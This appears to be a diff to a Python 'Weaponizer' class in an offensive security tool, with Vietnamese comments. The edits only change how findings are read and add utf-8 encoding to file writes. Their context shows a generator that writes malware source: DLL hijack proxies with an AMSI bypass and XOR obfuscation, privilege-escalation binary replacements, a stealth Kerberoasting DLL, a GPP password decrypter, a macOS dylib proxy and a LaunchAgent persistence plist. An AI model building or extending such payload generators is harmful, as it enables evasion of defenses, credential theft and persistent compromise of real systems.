@@ -47,18 +47,16 @@ class Weaponizer:
                     payloads_generated += 1
         else:
             # Fallback về logic cũ nếu không có bước xác thực
-            if "1.3 DLL Hijacking IAT" in self.report_data.get("results", {}):
-                findings = self.report_data["results"]["1.3 DLL Hijacking IAT"]
+            section_key = "1.3: DLL Hijacking & Side-loading"
+            if section_key in self.report_data:
+                findings = self.report_data[section_key]
                 if hasattr(findings, 'get'):  # If it's a dict
                     findings = findings.get("findings", findings)
                     
                 for v in findings:
                     if v.get('id') == "SYS-DLL-001":
                         # Sinh ra mã nguồn C cho DLL Hijacking
-                        details = v.get('details', '')
-                        dll_name = "hijacked.dll"
-                        if "(Tên: " in details:
-                            dll_name = details.split("(Tên: ")[1].split(")")[0].split(",")[0].strip()
+                        dll_name = v.get('dll_name', 'hijacked.dll')
                         
                         self._generate_dll_hijack_payload(dll_name)
                         payloads_generated += 1
@@ -83,7 +81,7 @@ class Weaponizer:
         for i, exp in enumerate(exports):
             def_content += f"    {exp}={orig_dll}.{exp} @{i+1}\n"
         def_path = os.path.join(self.output_dir, f"exploit_proxy_{dll_name}.def")
-        with open(def_path, "w") as f: f.write(def_content)
+        with open(def_path, "w", encoding="utf-8") as f: f.write(def_content)
 
         # 2. SOURCE (.c) - GHOST PROTOCOL
         # Mã hóa các chuỗi nhạy cảm
@@ -152,7 +150,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 }}
 """
         c_path = os.path.join(self.output_dir, f"exploit_proxy_{dll_name}.c")
-        with open(c_path, "w") as f: f.write(payload_code)
+        with open(c_path, "w", encoding="utf-8") as f: f.write(payload_code)
         
         print(f"  {Fore.MAGENTA}[GHOST] ĐÃ TÀNG HÌNH HÓA PAYLOAD: {c_path} (AMSI Bypass + XOR Integrated){Style.RESET_ALL}")
 
@@ -177,7 +175,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 }}
 """
         file_path = os.path.join(self.output_dir, f"exploit_for_{dll_name}.c")
-        with open(file_path, "w") as f: f.write(payload_c_code)
+        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_c_code)
         print(f"  {Fore.MAGENTA}[GHOST] Đã đẻ file Payload Tàng hình: {file_path}{Style.RESET_ALL}")
 
     def _generate_binary_replacement_payload(self):
@@ -204,7 +202,7 @@ int main() {{
 }}
 """
         file_path = os.path.join(self.output_dir, f"lpe_replacement_{filename}.c")
-        with open(file_path, "w") as f:
+        with open(file_path, "w", encoding="utf-8") as f:
             f.write(payload_code)
         print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ LEO THANG (LPE): {file_path}{Style.RESET_ALL}")
 
@@ -232,7 +230,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul, LPVOID lp) {{
 }}
 """
         file_path = os.path.join(self.output_dir, "ad_kerberoast_stealth.c")
-        with open(file_path, "w") as f: f.write(payload_code)
+        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
         print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ AD (Stealth Kerberoast): {file_path}{Style.RESET_ALL}")
 
     def _generate_gpp_decrypter_payload(self):
@@ -260,7 +258,7 @@ int main() {
 }
 """
         file_path = os.path.join(self.output_dir, "ad_gpp_decrypter.c")
-        with open(file_path, "w") as f: f.write(payload_code)
+        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
         print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ AD (GPP Decrypter): {file_path}{Style.RESET_ALL}")
 
     def _generate_macos_dylib_payload(self):
@@ -279,7 +277,7 @@ static void MacPwn() {
 }
 """
         file_path = os.path.join(self.output_dir, "macos_exploit_proxy.c")
-        with open(file_path, "w") as f: f.write(payload_code)
+        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
         print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ macOS (dylib Proxy): {file_path}{Style.RESET_ALL}")
 
     def _generate_launchagent_payload(self):
@@ -300,5 +298,5 @@ static void MacPwn() {
 </plist>
 """
         file_path = os.path.join(self.output_dir, "com.tcptf.persistence.plist")
-        with open(file_path, "w") as f: f.write(payload_code)
+        with open(file_path, "w", encoding="utf-8") as f: f.write(payload_code)
         print(f"  {Fore.RED}[!!] ĐÃ ĐẺ VŨ KHÍ macOS (LaunchAgent): {file_path}{Style.RESET_ALL}")
